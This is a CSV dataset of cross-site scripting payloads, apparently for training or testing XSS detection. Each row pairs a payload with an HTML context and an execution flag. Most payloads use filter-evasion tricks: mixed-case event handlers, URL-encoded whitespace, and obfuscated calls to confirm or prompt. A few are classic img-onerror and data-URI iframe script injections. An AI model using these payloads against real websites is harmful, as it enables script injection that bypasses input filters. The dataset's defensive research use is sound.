payload,context,exec,combined
<d3V%09ONmousEOVeR%0d=%0dconfirm()>v3dm0s,html_tag,1,CONTEXT_html_tag <d3V%09ONmousEOVeR%0d=%0dconfirm()>v3dm0s
<deTaiLs%0donPointereNteR%0d=%0d(prompt)``//,html_text,0,CONTEXT_html_text <deTaiLs%0donPointereNteR%0d=%0d(prompt)``//
<hTml/+/OnpoiNTerENter%09=%09confirm()%0dx>,html_tag,0,CONTEXT_html_tag <hTml/+/OnpoiNTerENter%09=%09confirm()%0dx>
<A/+/oNmOUsEoveR%0a=%0a[8].find(confirm)>v3dm0s,html_tag,1,CONTEXT_html_tag <A/+/oNmOUsEoveR%0a=%0a[8].find(confirm)>v3dm0s
<A/+/onpOiNTEReNtER%0a=%0a(confirm)()>v3dm0s,html_tag,1,CONTEXT_html_tag <A/+/onpOiNTEReNtER%0a=%0a(confirm)()>v3dm0s
<deTAILS%0aOnPoINtERenTEr%0d=%0d(confirm)()>,html_tag,0,CONTEXT_html_tag <deTAILS%0aOnPoINtERenTEr%0d=%0d(confirm)()>
<HtmL%09onMOuSeoVeR+=+confirm()//,html_text,0,CONTEXT_html_text <HtmL%09onMOuSeoVeR+=+confirm()//
<img src=x onerror=confirm(1)>,html_tag,1,CONTEXT_html_tag <img src=x onerror=confirm(1)>
<D3v%0donpoInTeRenTer%0d=%0dconfirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <D3v%0donpoInTeRenTer%0d=%0dconfirm()%0dx>v3dm0s
<d3V%09oNmoUSEovER%0d=%0dconfirm()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <d3V%09oNmoUSEovER%0d=%0dconfirm()%0dx>v3dm0s
<detaIls%0dontoggLe%09=%09confirm()//,html_text,0,CONTEXT_html_text <detaIls%0dontoggLe%09=%09confirm()//
"<dEtailS%09oNpoInTerENTEr+=+a=prompt,a()%0dx//",html_tag,0,"CONTEXT_html_tag <dEtailS%09oNpoInTerENTEr+=+a=prompt,a()%0dx//"
<A%0aONMoUseOver+=+[8].find(confirm)%0dx>v3dm0s,html_text,0,CONTEXT_html_text <A%0aONMoUseOver+=+[8].find(confirm)%0dx>v3dm0s
<D3V%0dOnPOINTEREntEr%0d=%0d[8].find(confirm)%0dx>v3dm0s,html_text,1,CONTEXT_html_text <D3V%0dOnPOINTEREntEr%0d=%0d[8].find(confirm)%0dx>v3dm0s
<HtmL%0aonmouSEovER%09=%09confirm()%0dx//,html_text,0,CONTEXT_html_text <HtmL%0aonmouSEovER%09=%09confirm()%0dx//
<A%0doNmOuseOVEr%0a=%0a[8].find(confirm)%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <A%0doNmOuseOVEr%0a=%0a[8].find(confirm)%0dx>v3dm0s
<A%0aoNMoUsEOVER%0a=%0aconfirm()>v3dm0s,html_tag,1,CONTEXT_html_tag <A%0aoNMoUsEOVER%0a=%0aconfirm()>v3dm0s
<A/+/ONPointEreNTer+=+(confirm)()%0dx>v3dm0s,html_text,0,CONTEXT_html_text <A/+/ONPointEreNTer+=+(confirm)()%0dx>v3dm0s
"<iframe src=""data:text/html,<script>alert(1)</script>"">",html_tag,1,"CONTEXT_html_tag <iframe src=""data:text/html,<script>alert(1)</script>"">"
<a%0aoNpoINTEreNTeR%09=%09(prompt)``>v3dm0s,html_text,1,CONTEXT_html_text <a%0aoNpoINTEreNTeR%09=%09(prompt)``>v3dm0s
<D3v/+/OnPOIntERentER+=+confirm()%0dx>v3dm0s,html_text,0,CONTEXT_html_text <D3v/+/OnPOIntERentER+=+confirm()%0dx>v3dm0s
<a/+/ONmOusEoVEr%0d=%0dconfirm()>v3dm0s,html_tag,1,CONTEXT_html_tag <a/+/ONmOusEoVEr%0d=%0dconfirm()>v3dm0s
